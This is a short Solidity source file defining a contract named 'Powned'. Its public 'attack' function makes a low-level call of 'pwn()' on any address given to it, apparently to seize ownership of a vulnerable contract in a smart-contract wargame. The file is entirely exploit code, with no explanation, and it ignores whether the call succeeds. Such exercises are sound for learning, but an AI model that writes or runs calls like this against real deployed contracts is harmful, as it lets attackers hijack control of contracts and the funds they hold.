pragma solidity ^0.6.0;

contract Powned {
    function attack(address _to) public {
        (bool success, ) = _to.call(abi.encodeWithSignature("pwn()"));
    }
}
